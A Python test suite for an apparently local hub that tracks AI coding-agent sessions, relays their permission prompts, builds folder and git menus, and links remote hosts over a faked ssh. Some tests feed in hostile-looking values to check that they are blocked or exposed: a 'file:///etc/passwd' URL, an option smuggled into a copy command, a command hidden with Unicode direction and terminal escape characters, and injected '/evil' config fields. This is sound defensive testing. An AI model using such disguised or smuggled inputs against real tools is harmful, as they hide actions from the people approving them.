    def test_dialog_asks_with_its_label_until_it_closes(self):
        pi = self.attach()
        pi.start()
        pi.client.send(op="dialog", text="bash: rm -rf build")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "asking" and s["reason"] == "bash: rm -rf build"))
        pi.client.send(op="dialog", text=None)
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))

    def test_a_session_that_never_finished_a_turn_is_not_kept(self):
        pi = self.attach()
        pi.start()
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        pi.close()
        state = self.bar.wait(lacks_session(self.sid))
        self.assertEqual(state["recent"], [])

    def test_a_session_that_ended_keeps_its_repository(self):
        repo = git_repo(self.hub.tmp / "repo")
        pi = self.attach(cwd=str(repo))
        pi.start()
        self.bar.wait(has_session(self.sid, lambda s: s.get("project") == "repo"))
        pi.end()
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        pi.close()
        state = self.bar.wait(lambda m: m["type"] == "state" and m["recent"])
        self.assertEqual(state["recent"][0]["project"], "repo")

    def test_session_that_ended_is_recent_with_the_command_that_resumes_it(self):
        state = self.finished(cwd="/home/me/repo")
        self.assertEqual((state["recent"][0]["name"], state["recent"][0]["summary"]), ("repo", "Done."))
        self.assertEqual(state["recent"][0]["resume"], f"cd /home/me/repo && pi --session {self.sid[:8]}")
        self.assertEqual(self.hub.command("recent").stdout, f"repo\tcd /home/me/repo && pi --session {self.sid[:8]}\n")

    def test_resume_opens_a_terminal_on_the_command_through_niri(self):
        self.finished(cwd="/home/me/repo")
        self.bar.send(op="resume", session=self.sid)
        spawned = logged(Path(str(self.hub.focus_log) + ".spawn"))
        self.assertEqual(spawned, [["ghostty", "--working-directory=/home/me/repo", "-e", "pi", "--session", self.sid[:8]]])

    def test_a_resumed_session_leaves_the_recent_list_with_its_history(self):
        self.finished()
        self.attach()
        state = self.bar.wait(has_session(self.sid, lambda s: [h["did"] for h in s["history"]] == ["Done."]))
        self.assertEqual(state["recent"], [])


class AlertTest(HubTest):
    """What the bar's dot does, end to end."""

    def setUp(self):
        super().setUp()
        self.proc = self.hub.process()
        self.bar = self.hub.subscribe()
        self.pi = Pi(self.hub, self.sid, self.proc.pid)
        self.bar.wait(has_session(self.sid))

    def fails(self):
        self.pi.start()
        self.pi.end(error=True)
        return self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed"))

    def test_a_failure_pulses_until_the_popout_opens(self):
        self.assertTrue(session(self.fails(), self.sid)["pulse"])
        self.bar.send(op="seen")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed" and not s["pulse"]))

    def test_a_done_turn_pulses_once(self):
        self.pi.start()
        self.pi.end()
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done" and s["pulse"]))
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done" and not s["pulse"]))

    def test_a_known_failure_does_not_pulse_again_after_a_restart(self):
        self.fails()
        self.hub.restart()
        bar = self.hub.connect()
        bar.send(op="subscribe")
        pi = Pi(self.hub, self.sid, self.proc.pid)
        bar.wait(has_session(self.sid, lambda s: s["state"] == "failed" and not s["pulse"]))
        pi.close()


class HiddenTest(HubTest):
    """A session an agent spawned, tracked but kept off the bar."""

    def setUp(self):
        super().setUp()
        self.proc = self.hub.process()
        self.bar = self.hub.subscribe()
        self.hub.write_session(self.proc.pid, self.sid, status="busy")
        self.bar.wait(has_session(self.sid))
        self.transcript = self.hub.write_transcript(self.sid, [prompt("go"), said("Want me to push?")])

    def hook(self, name, **env):
        event = {"hook_event_name": name, "session_id": self.sid, "transcript_path": str(self.transcript), "prompt": "go"}
        self.hub.command("hook", stdin=json.dumps(event), **env)

    def test_a_hidden_session_leaves_the_bar_and_is_counted(self):
        self.hook("SessionStart", AGENT_HUB_HIDDEN="1")
        state = self.bar.wait(lacks_session(self.sid))
        self.assertEqual(state["hidden"], 1)
        self.hook("Stop", AGENT_HUB_HIDDEN="1")
        self.assertEqual(self.hub.command("status").stdout, "hidden\t1\n")

    def test_a_hidden_pi_keeps_its_own_row_in_its_own_tui(self):
        proc = self.hub.process()
        pi = Pi(self.hub, "spawned", proc.pid, hidden=True)
        pi.row(lambda push: push["row"]["id"] == "spawned")
        pi.start()
        self.assertIsNone(session(self.bar.wait(lambda m: m["type"] == "state" and m["hidden"] == 1), "spawned"))

    def test_off_means_the_hooks_do_nothing(self):
        self.hook("Stop", AGENT_HUB="off")
        self.hook("SessionStart", AGENT_HUB="off", AGENT_HUB_HIDDEN="1")
        self.assertIn("working", self.hub.command("status").stdout)

    def test_status_with_no_session_lists_them_all(self):
        lines = self.hub.command("status").stdout.splitlines()
        self.assertEqual(lines[0].split("\t")[0], "working")
        self.assertEqual(json.loads(self.hub.command("status", "--json").stdout)["hidden"], 0)


# Stands in for `ssh -T -F config host agent-hub attach`: runs the real attach against the host's hub.
FAKE_SSH = """#!{python}
import os, sys
host = sys.argv[sys.argv.index("-F") + 2]
os.environ["XDG_RUNTIME_DIR"] = {runtimes!r} + "/" + host
os.environ["XDG_STATE_HOME"] = {runtimes!r} + "/" + host + "-state"
with open({log!r}, "a") as log:
    log.write(" ".join(sys.argv[1:]) + "\\n")
if os.path.exists({runtimes!r} + "/" + host + ".fail"):
    sys.exit(open({runtimes!r} + "/" + host + ".fail").read())
os.chdir({package!r})
os.execv(sys.executable, [sys.executable, "-m", "agent_hub", "attach", "--control"])
"""


def git_repo(path, remote=None, branch="main"):
    """A git repo with one commit and one uncommitted file; returns its path."""
    path.mkdir(parents=True)

    def git(*args):
        subprocess.run(["git", "-C", str(path), "-c", "user.name=t", "-c", "user.email=t@t", *args], check=True, capture_output=True)

    git("init", "-b", branch)
    (path / "a").write_text("a")
    git("add", "a")
    git("commit", "-m", "one")
    (path / "b").write_text("b")
    if remote:
        git("remote", "add", "origin", remote)
    return path


class PermissionTest(HubTest):
    """A prompt held open by Claude's hook, which the bar or the terminal settles first."""

    COMMAND = "rm -rf build\n  && make"

    def setUp(self):
        super().setUp()
        self.proc = self.hub.process()
        self.bar = self.hub.subscribe()
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="permission prompt")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "asking"))

    def asks(self, command=COMMAND, **fields):
        hook = self.hub.held_hook(self, self.sid, {"command": command, **fields})
        row = session(self.bar.wait(has_session(self.sid, lambda s: command[:9] in s.get("permission", {}).get("body", ""))), self.sid)
        return hook, row["permission"]

    def released(self, hook):
        """What the hook printed once the hub let it go."""
        return hook.communicate(timeout=TIMEOUT)[0]

    def test_the_bar_sees_all_of_the_call(self):
        _, permission = self.asks(description="Clean and build")
        self.assertEqual({k: permission[k] for k in ("tool", "about", "kind", "body", "complete")},
                         {"tool": "Bash", "about": "Clean and build", "kind": "command", "body": self.COMMAND, "complete": True})

    def test_allowing_tells_claude(self):
        hook, permission = self.asks()
        self.bar.send(op="answer", session=self.sid, ask=permission["id"], allow=True)
        self.assertEqual(json.loads(self.released(hook))["hookSpecificOutput"], {"hookEventName": "PermissionRequest", "decision": {"behavior": "allow"}})
        self.bar.wait(has_session(self.sid, lambda s: s["state"] != "asking"))

    def test_denying_tells_claude_it_came_from_here(self):
        hook, permission = self.asks()
        self.bar.send(op="answer", session=self.sid, ask=permission["id"], allow=False)
        decision = json.loads(self.released(hook))["hookSpecificOutput"]["decision"]
        self.assertEqual((decision["behavior"], decision["message"]), ("deny", "Denied from the agent hub."))

    def test_an_answer_to_another_prompt_does_nothing(self):
        hook, permission = self.asks()
        self.bar.send(op="answer", session=self.sid, ask=permission["id"] + 1, allow=True)
        self.bar.send(op="answer", session=self.sid, ask=permission["id"], allow=False)
        self.assertEqual(json.loads(self.released(hook))["hookSpecificOutput"]["decision"]["behavior"], "deny")

    def test_a_call_too_long_to_show_can_be_denied_but_not_allowed(self):
        hook, permission = self.asks("x" * 5000)
        self.assertFalse(permission["complete"])
        self.bar.send(op="answer", session=self.sid, ask=permission["id"], allow=True)
        self.bar.send(op="answer", session=self.sid, ask=permission["id"], allow=False)
        self.assertEqual(json.loads(self.released(hook))["hookSpecificOutput"]["decision"]["behavior"], "deny")

    def test_answering_in_the_terminal_lets_the_hook_go_saying_nothing(self):
        hook, _ = self.asks()
        self.hub.write_session(self.proc.pid, self.sid, status="busy")
        self.assertEqual(self.released(hook), "")
        self.bar.wait(has_session(self.sid, lambda s: "permission" not in s))

    def test_a_status_older_than_the_prompt_does_not_close_it(self):
        self.hub.write_session(self.proc.pid, self.sid, status="busy")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        hook, _ = self.asks()
        self.hub.write_session(self.proc.pid, self.sid, status="busy", since=int(time.time() * 1000) - 60_000)
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        self.assertIsNone(hook.poll())
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="permission prompt")
        self.bar.wait(has_session(self.sid, lambda s: "permission" in s))

    def test_the_next_prompt_shows_once_the_first_closes(self):
        first, permission = self.asks()
        self.hub.held_hook(self, self.sid, {"command": "second"})
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="permission prompt", since=int(time.time() * 1000) + 1000)
        self.assertEqual(self.released(first), "")
        row = session(self.bar.wait(has_session(self.sid, lambda s: s.get("permission", {}).get("body") == "second")), self.sid)
        self.assertNotEqual(row["permission"]["id"], permission["id"])
        self.assertEqual(row["waitingFor"], "Bash: second")

    def test_a_turn_ending_lets_the_hook_go(self):
        hook, _ = self.asks()
        self.hub.command("hook", stdin=json.dumps({"hook_event_name": "Stop", "session_id": self.sid}))
        self.assertEqual(self.released(hook), "")

    def test_a_hook_that_died_can_no_longer_be_answered(self):
        hook, _ = self.asks()
        hook.kill()
        self.bar.wait(has_session(self.sid, lambda s: "permission" not in s))

    def test_a_demo_prompt_shows_but_answers_nothing(self):
        demo = {"sessionId": "demo", "status": "waiting", "waitingFor": "Bash: ls", "name": "d", "statusUpdatedAt": 1,
                "permission": {"id": 0, "tool": "Bash", "about": "", "kind": "command", "body": "ls", "complete": True}}
        self.bar.send(op="demo", sessions=[demo])
        self.bar.wait(has_session("demo", lambda s: "permission" in s))
        self.bar.send(op="answer", session="demo", ask=0, allow=True)
        hook, permission = self.asks()
        self.bar.send(op="answer", session=self.sid, ask=permission["id"], allow=False)
        self.assertEqual(json.loads(self.released(hook))["hookSpecificOutput"]["decision"]["behavior"], "deny")

    def test_a_hub_going_away_lets_the_hook_go(self):
        hook, _ = self.asks()
        self.hub.kill()
        self.assertEqual(self.released(hook), "")
        self.hub.socket.unlink()
        self.hub.start()


class PermissionAskTest(unittest.TestCase):
    def test_an_edit_shows_as_the_lines_it_changes(self):
        ask = claude.permission_ask("Edit", {"file_path": "/repo/a.nix", "old_string": "x = 1;\ny = 2;", "new_string": "x = 3;"}, "/repo")
        self.assertEqual((ask["kind"], ask["about"], ask["body"]), ("diff", "a.nix", "- x = 1;\n- y = 2;\n+ x = 3;"))

    def test_a_write_shows_all_it_writes(self):
        self.assertEqual(claude.permission_ask("Write", {"file_path": "/a", "content": "one\ntwo"}, "/")["body"], "+ one\n+ two")

    def test_a_tool_it_knows_nothing_of_shows_its_input(self):
        ask = claude.permission_ask("mcp__home__turn_on", {"light": "desk"}, "/")
        self.assertEqual((ask["kind"], ask["about"], json.loads(ask["body"])), ("text", "home · turn_on", {"light": "desk"}))

    def test_what_could_disguise_a_command_is_marked_not_hidden(self):
        self.assertEqual(claude.permission_ask("Bash", {"command": "ls‮ -l\x1b[2K\r\nrm"}, "/")["body"], "ls� -l�[2K\nrm")


class RowDetailTest(HubTest):
    """What a row says beyond its state, for the popout's pane."""

    def hook(self, name, **event):
        self.hub.command("hook", stdin=json.dumps({"hook_event_name": name, "session_id": self.sid, **event}))

    def setUp(self):
        super().setUp()
        self.proc = self.hub.process()
        self.bar = self.hub.subscribe()
        self.hub.write_session(self.proc.pid, self.sid, status="idle")
        self.bar.wait(has_session(self.sid))

    def test_a_finished_turn_keeps_the_agents_own_closing_words(self):
        words = "Rebased onto main.\n\nWant me to push?"
        transcript = self.hub.write_transcript(self.sid, [prompt("rebase it"), said(words)])
        self.hook("Stop", transcript_path=str(transcript), last_assistant_message=words)
        row = session(self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done")), self.sid)
        self.assertEqual(row["said"], words)

    def test_your_last_prompt_shows_but_is_never_saved(self):
        self.hook("UserPromptSubmit", prompt="rebase\nit please")
        self.bar.wait(has_session(self.sid, lambda s: s.get("prompt") == "rebase it please"))
        eventually(lambda: (self.hub.tmp / "state.json").exists())
        self.assertNotIn("rebase it please", (self.hub.tmp / "state.json").read_text())

    def test_a_slash_commands_markup_is_not_your_prompt(self):
        self.hook("UserPromptSubmit", prompt="<command-name>/x</command-name>")
        state = self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        self.assertNotIn("prompt", session(state, self.sid))

    def test_a_row_says_its_branch_and_changes_and_who_shares_its_tree(self):
        repo = git_repo(self.hub.tmp / "repo", branch="topic")
        self.hub.write_session(self.proc.pid, self.sid, status="idle", cwd=str(repo), name="one")
        other = str(uuid.uuid4())
        self.hub.write_session(self.hub.process().pid, other, status="idle", cwd=str(repo / ""), name="two")
        state = self.bar.wait(has_session(self.sid, lambda s: s.get("branch") == "topic" and s.get("peers") == ["two"]))
        self.assertEqual(session(state, self.sid)["changed"], 1)
        self.assertEqual(session(state, other)["peers"], ["one"])

    def test_a_row_names_its_repository_from_any_of_its_worktrees(self):
        repo = git_repo(self.hub.tmp / "repo")
        tree = self.hub.tmp / "elsewhere"
        subprocess.run(["git", "-C", str(repo), "worktree", "add", str(tree)], check=True, capture_output=True)
        self.hub.write_session(self.proc.pid, self.sid, status="idle", cwd=str(tree))
        self.bar.wait(has_session(self.sid, lambda s: s.get("project") == "repo"))

    def test_outside_git_there_is_no_branch_to_show(self):
        self.hub.write_session(self.proc.pid, self.sid, status="idle", cwd=str(self.hub.tmp))
        state = self.bar.wait(has_session(self.sid, lambda s: s["cwd"] == str(self.hub.tmp)))
        self.assertNotIn("branch", session(state, self.sid))

    def test_a_working_session_says_when_its_transcript_last_moved(self):
        transcript = self.hub.write_transcript(self.sid, [prompt("go")])
        self.hook("UserPromptSubmit", prompt="go", transcript_path=str(transcript))
        state = self.bar.wait(has_session(self.sid, lambda s: "activity" in s))
        self.assertEqual(session(state, self.sid)["activity"], int(transcript.stat().st_mtime * 1000))

    def test_background_work_is_named(self):
        transcript = self.hub.write_transcript(self.sid, [prompt("go"), said("Started it.")])
        self.hook("Stop", transcript_path=str(transcript), background_tasks=[{"type": "subagent", "description": "just build"}])
        self.bar.wait(has_session(self.sid, lambda s: s.get("jobs") == ["just build"]))


class MenuTest(unittest.TestCase):
    """A row's folder and git menus, and what their rows do."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="agent-hub-menu-"))
        (self.tmp / "bin").mkdir()
        for command in ("code", "zed"):
            (self.tmp / "bin" / command).write_text("")
            (self.tmp / "bin" / command).chmod(0o755)
        self.gh_answer = self.tmp / "gh.answer"
        gh = self.tmp / "gh"
        gh.write_text(f"#!/bin/sh\nexec cat {self.gh_answer}\n")
        gh.chmod(0o755)
        self.gh_answer.write_text("[]")
        self.hub = Hub(extra={"appPath": [str(self.tmp / "bin")], "gh": str(gh), "editor": "zed"})
        self.addCleanup(self.hub.stop)
        self.bar = self.hub.subscribe()
        self.sid = str(uuid.uuid4())
        self.repo = git_repo(self.tmp / "repo", "https://github.com/me/thing.git")
        self.hub.write_session(self.hub.process().pid, self.sid, status="idle", cwd=str(self.repo))
        self.bar.wait(has_session(self.sid))
        self.spawned = Path(str(self.hub.focus_log) + ".spawn")

    def menu(self, which, request=1):
        self.bar.send(op="menu", request=request, session=self.sid, which=which)
        return self.bar.wait(lambda m: m["type"] == "menu" and m["request"] == request)["menu"]

    def test_the_folder_menu_lists_every_app_and_says_which_it_cant_run(self):
        menu = self.menu("folder")
        rows = {r["id"]: r for r in menu["rows"]}
        self.assertEqual(list(rows), ["zed", "smerge", "files", "ghostty", "copy"])
        self.assertEqual(rows["smerge"]["unavailable"], "not installed")
        self.assertEqual((rows["copy"]["run"], menu["preferred"]), ({"kind": "copy", "value": str(self.repo)}, "zed"))

    def test_an_app_opens_the_rows_folder(self):
        self.bar.send(op="run", session=self.sid, kind="app", value="zed")
        self.assertEqual(logged(self.spawned)[0], ["zed", str(self.repo)])

    def test_an_app_it_cant_run_or_doesnt_know_does_nothing(self):
        self.bar.send(op="run", session=self.sid, kind="app", value="smerge")
        self.bar.send(op="run", session=self.sid, kind="app", value="rm")
        self.bar.send(op="run", session=self.sid, kind="url", value="https://example.com/")
        self.assertEqual(logged(self.spawned), [["xdg-open", "https://example.com/"]])

    def test_only_a_web_link_is_opened(self):
        self.bar.send(op="run", session=self.sid, kind="url", value="file:///etc/passwd")
        self.bar.send(op="run", session=self.sid, kind="copy", value="-x")
        self.assertEqual(logged(self.spawned), [["wl-copy", "--", "-x"]])

    def test_the_git_menu_answers_at_once_and_again_with_the_pull_request(self):
        self.gh_answer.write_text(json.dumps([{"number": 7, "url": "https://github.com/me/thing/pull/7", "state": "OPEN", "isDraft": True}]))
        first = self.menu("git")
        self.assertEqual({r["id"]: r for r in first["rows"]}["repo"]["run"]["value"], "https://github.com/me/thing")
        self.assertEqual(first["preferred"], "branch")
        second = self.bar.wait(lambda m: m["type"] == "menu")["menu"]
        rows = {r["id"]: r for r in second["rows"]}
        self.assertEqual((second["preferred"], rows["pr"]["description"]), ("pr", "draft"))
        self.assertEqual(rows["create"]["unavailable"], "PR #7 is open")

    def test_a_row_that_doesnt_exist_has_no_menu(self):
        self.bar.send(op="menu", request=2, session="nope", which="git")
        self.assertIsNone(self.bar.wait(lambda m: m["type"] == "menu")["menu"])


class ForgeTest(unittest.TestCase):
    def test_each_form_of_remote_is_read(self):
        for raw in ("git@github.com:me/thing.git", "https://github.com/me/thing.git", "ssh://git@github.com/me/thing", "https://github.com/me/thing/"):
            self.assertEqual(menus.parse_remote(raw)["web"], "https://github.com/me/thing", raw)
        self.assertEqual(menus.parse_remote("git@gitlab.com:a/b/c.git")["owner"], "a/b")

    def test_a_forge_or_path_it_doesnt_know_has_no_links(self):
        for raw in ("git@git.example.com:me/thing.git", "https://github.com/me", "", "https://github.com/me/th ing"):
            self.assertIsNone(menus.parse_remote(raw), raw)

    def test_a_branch_links_as_each_forge_lays_it_out(self):
        for raw, leaf in (("git@github.com:a/b", "/tree/x%23y"), ("git@gitlab.com:a/b", "/-/tree/x%23y"), ("git@codeberg.org:a/b", "/src/branch/x%23y")):
            remote = menus.parse_remote(raw)
            self.assertEqual(menus.branch_url(remote, "x#y"), remote["web"] + leaf)

    def test_without_a_supported_remote_only_copying_works(self):
        menu = menus.git_menu({"branch": "main", "oid": "abc", "remote": "", "base": "main", "upstream": True})
        self.assertEqual([r["id"] for r in menu["rows"] if "run" in r], ["copy"])
        self.assertEqual(menu["preferred"], "repo")

    def test_a_detached_head_links_its_commit(self):
        menu = menus.git_menu({"branch": "", "oid": "abcdef0123", "remote": "git@github.com:a/b", "base": "main", "upstream": False})
        rows = {r["id"]: r for r in menu["rows"]}
        self.assertEqual((rows["commit"]["label"], rows["commit"]["run"]["value"]), ("Open commit abcdef0", "https://github.com/a/b/commit/abcdef0123"))
        self.assertEqual((rows["create"]["unavailable"], rows["copy"]["label"]), ("detached HEAD", "Copy commit SHA"))

    def test_a_branch_not_pushed_cant_get_a_pull_request_yet(self):
        menu = menus.git_menu({"branch": "x", "oid": "a", "remote": "git@github.com:a/b", "base": "main", "upstream": False}, None, True)
        self.assertEqual({r["id"]: r for r in menu["rows"]}["create"]["unavailable"], "push the branch first")

    def test_a_merged_pull_request_offers_a_new_one(self):
        pr = {"number": 1, "url": "https://github.com/a/b/pull/1", "state": "merged"}
        menu = menus.git_menu({"branch": "x", "oid": "a", "remote": "git@github.com:a/b", "base": "dev", "upstream": True}, pr, True)
        create = {r["id"]: r for r in menu["rows"]}["create"]
        self.assertEqual((create["label"], create["run"]["value"]), ("Create new pull request", "https://github.com/a/b/compare/dev...x?expand=1"))

    def test_from_another_host_the_menu_says_where_the_folder_is(self):
        rows = {r["id"]: r for r in menus.folder_menu("/x", "far", lambda app: True)["rows"]}
        self.assertEqual((rows["files"]["unavailable"], rows["zed"]["run"]["value"]), ("on far", "zed"))


class LinkTest(unittest.TestCase):
    """A viewer hub with another host's hub piped in, through the real `attach`."""

    def setUp(self):
        self.far = Hub()
        self.addCleanup(self.far.stop)
        self.tmp = Path(tempfile.mkdtemp(prefix="agent-hub-link-"))
        (self.tmp / "far").symlink_to(self.far.socket.parent.parent)
        self.ssh_log = self.tmp / "ssh.log"
        ssh = self.tmp / "ssh"
        ssh.write_text(FAKE_SSH.format(python=sys.executable, runtimes=str(self.tmp), log=str(self.ssh_log), package=str(PACKAGE)))
        ssh.chmod(0o755)
        (self.tmp / "bin").mkdir()
        (self.tmp / "bin" / "zed").write_text("")
        (self.tmp / "bin" / "zed").chmod(0o755)
        self.near = Hub(extra={"remotes": ["far"], "ssh": str(ssh), "sshConfig": "/dev/null", "appPath": [str(self.tmp / "bin")]})
        self.addCleanup(self.near.stop)
        self.sid = str(uuid.uuid4())
        self.bar = self.near.subscribe()
        self.proc = self.far.process()
        self.far_bar = self.far.subscribe()
        self.pi = Pi(self.far, self.sid, self.proc.pid, cwd="/far/repo")
        self.rid = f"far:{self.sid}"
        self.bar.wait(has_session(self.rid))

    def asks(self):
        """The far session's turn fails, which wants you until you put it away."""
        self.pi.start()
        self.pi.end(said="The build broke.", error=True)
        return self.bar.wait(has_session(self.rid, lambda s: s["state"] == "failed"))

    def test_a_session_on_another_host_shows_stamped_by_the_viewer(self):
        row = session(self.asks(), self.rid)
        self.assertEqual((row["host"], row["pid"], row["window"], row["said"]), ("far", None, None, "The build broke."))
        self.assertTrue(row["pulse"])

    def test_the_link_goes_through_its_own_ssh_config_and_says_it_is_up(self):
        state = self.asks()
        self.assertEqual(state["links"], [{"host": "far", "status": "up"}])
        self.assertIn("-T -F /dev/null far agent-hub attach", self.ssh_log.read_text())

    def test_a_viewer_can_dismiss_only_the_turn_it_saw(self):
        row = session(self.asks(), self.rid)
        self.bar.send(op="dismiss", session=self.rid, turn=row["turn"] - 1)
        self.bar.send(op="dismiss", session=self.rid, turn=row["turn"])
        self.bar.wait(has_session(self.rid, lambda s: s["state"] == "idle"))

    def test_undo_brings_back_what_a_viewer_dismissed_there(self):
        self.asks()
        self.bar.send(op="dismiss", session=self.rid)
        self.bar.wait(has_session(self.rid, lambda s: s["state"] == "idle"))
        self.far_bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
        self.bar.send(op="undo")
        row = session(self.bar.wait(has_session(self.rid, lambda s: s["state"] == "failed")), self.rid)
        self.assertFalse(row["pulse"])

    def far_prompt(self):
        """A Claude session on the far host with a prompt open; (its hook, its row at the viewer)."""
        sid, proc = str(uuid.uuid4()), self.far.process()
        self.far.write_session(proc.pid, sid, status="waiting", waitingFor="permission prompt", cwd="/far/repo")
        hook = self.far.held_hook(self, sid, {"command": "make", "description": "Build it"})
        rid = f"far:{sid}"
        return hook, rid, session(self.bar.wait(has_session(rid, lambda s: "permission" in s)), rid)

    def test_a_viewer_answers_a_prompt_on_the_other_host(self):
        hook, rid, row = self.far_prompt()
        self.assertEqual(row["permission"]["body"], "make")
        self.bar.send(op="answer", session=rid, ask=row["permission"]["id"], allow=True)
        out, _ = hook.communicate(timeout=TIMEOUT)
        self.assertEqual(json.loads(out)["hookSpecificOutput"]["decision"], {"behavior": "allow"})

    def test_the_folder_menu_opens_what_can_go_over_ssh_and_says_where_the_rest_is(self):
        self.asks()
        self.bar.send(op="menu", request=7, session=self.rid, which="folder")
        rows = {r["id"]: r for r in self.bar.wait(lambda m: m["type"] == "menu")["menu"]["rows"]}
        self.assertEqual(rows["smerge"]["unavailable"], "not installed" if not shutil.which("smerge") else "on far")
        self.assertEqual(rows["copy"]["run"], {"kind": "copy", "value": "/far/repo"})
        self.bar.send(op="run", session=self.rid, kind="app", value="ghostty")
        self.bar.send(op="run", session=self.rid, kind="app", value="zed")
        spawned = Path(str(self.near.focus_log) + ".spawn")
        eventually(lambda: spawned.exists() and len(spawned.read_text().splitlines()) == 2)
        self.assertEqual(logged(spawned)[0][-4:], ["ssh", "-t", "far", "cd /far/repo && exec \"$SHELL\" -l"])
        self.assertEqual(logged(spawned)[1], ["zed", "ssh://far/far/repo"])

    def test_the_git_menu_builds_its_links_here_from_what_git_says_there(self):
        repo = git_repo(self.far.tmp / "repo", "git@github.com:me/thing.git")
        rid = f"far:{(sid := str(uuid.uuid4()))}"
        self.far.write_session(self.far.process().pid, sid, status="idle", cwd=str(repo))
        self.bar.wait(has_session(rid))
        self.bar.send(op="menu", request=8, session=rid, which="git")
        menu = self.bar.wait(lambda m: m["type"] == "menu")["menu"]
        rows = {r["id"]: r for r in menu["rows"]}
        self.assertEqual((menu["context"], rows["branch"]["run"]["value"]), ("me/thing", "https://github.com/me/thing/tree/main"))

    def test_a_hub_that_lists_this_one_does_not_get_its_own_rows_back(self):
        self.asks()
        client = self.near.connect()
        client.send(op="subscribe", local=True)
        self.assertEqual(client.wait(lambda m: m["type"] == "state")["sessions"], [])

    def test_a_known_turn_stays_quiet_after_the_link_drops_and_a_new_one_pulses(self):
        self.asks()
        self.bar.send(op="seen")
        self.bar.wait(has_session(self.rid, lambda s: s["state"] == "failed" and not s["pulse"]))
        self.far.restart()
        self.bar.wait(lambda m: m["type"] == "state" and m["links"][0]["status"] != "up")
        self.pi = Pi(self.far, self.sid, self.proc.pid, cwd="/far/repo")
        self.bar.wait(has_session(self.rid, lambda s: s["state"] == "failed" and not s["pulse"]), timeout=30)
        self.pi.start()
        self.pi.end(error=True)
        self.bar.wait(has_session(self.rid, lambda s: s["state"] == "failed" and s["pulse"]), timeout=10)

    def test_enter_on_a_session_in_tmux_opens_a_terminal_on_it(self):
        self.pi.close()
        self.bar.wait(lacks_session(self.rid))
        Pi(self.far, self.sid, self.proc.pid, tmux="%12")
        self.bar.wait(has_session(self.rid, lambda s: s.get("tmux") == "%12"))
        self.bar.send(op="focus", session=self.rid)
        spawned = logged(Path(str(self.near.focus_log) + ".spawn"))
        self.assertEqual(spawned[0][-7:], ["ssh", "-t", "far", "tmux", "attach", "-t", "%12"])

    def test_an_ended_session_resumes_over_ssh(self):
        self.pi.start()
        self.pi.end()
        self.bar.wait(has_session(self.rid, lambda s: s["state"] == "done"))
        self.pi.close()
        state = self.bar.wait(lambda m: m["type"] == "state" and m["recent"])
        self.assertEqual(state["recent"][0]["resume"], f"ssh -t far 'cd /far/repo && pi --session {self.sid[:8]}'")
        self.bar.send(op="resume", session=self.rid)
        spawned = logged(Path(str(self.near.focus_log) + ".spawn"))
        self.assertEqual(spawned[0][-4:], ["ssh", "-t", "far", f"cd /far/repo && pi --session {self.sid[:8]}"])


class LinkFailureTest(unittest.TestCase):
    def link_status(self, said):
        tmp = Path(tempfile.mkdtemp(prefix="agent-hub-link-"))
        (tmp / "far.fail").write_text(said)
        ssh = tmp / "ssh"
        ssh.write_text(FAKE_SSH.format(python=sys.executable, runtimes=str(tmp), log=str(tmp / "ssh.log"), package=str(PACKAGE)))
        ssh.chmod(0o755)
        hub = Hub(extra={"remotes": ["far"], "ssh": str(ssh), "sshConfig": "/dev/null"})
        self.addCleanup(hub.stop)
        bar = hub.connect()
        # The link may have failed by the first state, which then is the one to read.
        bar.send(op="subscribe")
        return bar.wait(lambda m: m["type"] == "state" and m["links"][0]["status"] != "connecting")["links"][0]["status"]

    def test_each_failure_says_what_it_is(self):
        self.assertEqual(self.link_status("Permission denied (publickey)."), "auth failed")
        self.assertEqual(self.link_status("ssh: connect to host far port 22: Connection timed out"), "timeout")
        self.assertEqual(self.link_status("agent-hub: no hub here"), "no hub")
        self.assertEqual(self.link_status("ssh: Could not resolve hostname far"), "host down")


class AttachFilterTest(unittest.TestCase):
    def test_only_subscribe_passes_without_control(self):
        self.assertEqual(links.attach_filter(b'{"op":"subscribe","version":3,"extra":1}', False),
                         {"op": "subscribe", "local": True, "version": 3})
        for op in ("dismiss", "undismiss", "undo", "turn-start", "focus", "resume", "attach", "demo", "seen", "run", "menu"):
            self.assertIsNone(links.attach_filter(json.dumps({"op": op, "session": "s", "configDir": "/evil"}).encode(), False))
        self.assertIsNone(links.attach_filter(b'{"op":"answer","session":"s","ask":1,"allow":true}', False))
        self.assertIsNone(links.attach_filter(b'{"op":"git-facts","session":"s","request":1}', False))

    def test_control_adds_answering_a_prompt_and_asking_git_rebuilt_from_their_fields(self):
        self.assertEqual(links.attach_filter(b'{"op":"answer","session":"s","ask":2,"allow":true,"evil":1}', True),
                         {"op": "answer", "session": "s", "ask": 2, "allow": True})
        self.assertIsNone(links.attach_filter(b'{"op":"answer","session":"s","ask":2,"allow":"yes"}', True))
        self.assertEqual(links.attach_filter(b'{"op":"git-facts","session":"s","request":4,"evil":1}', True),
                         {"op": "git-facts", "session": "s", "request": 4})
        self.assertIsNone(links.attach_filter(b'{"op":"run","session":"s","kind":"app","value":"code"}', True))

    def test_control_adds_only_dismissing_and_its_undo_rebuilt_from_their_fields(self):
        for op in ("dismiss", "undismiss"):
            self.assertEqual(links.attach_filter(json.dumps({"op": op, "session": "s", "turn": 3, "configDir": "/evil"}).encode(), True),
                             {"op": op, "session": "s", "turn": 3})
        self.assertIsNone(links.attach_filter(b'{"op":"undo"}', True))
        self.assertIsNone(links.attach_filter(b'{"op":"turn-start","session":"s","configDir":"/evil"}', True))

    def test_junk_is_dropped(self):
        self.assertIsNone(links.attach_filter(b"not json", True))
        self.assertIsNone(links.attach_filter(b"[1]", True))


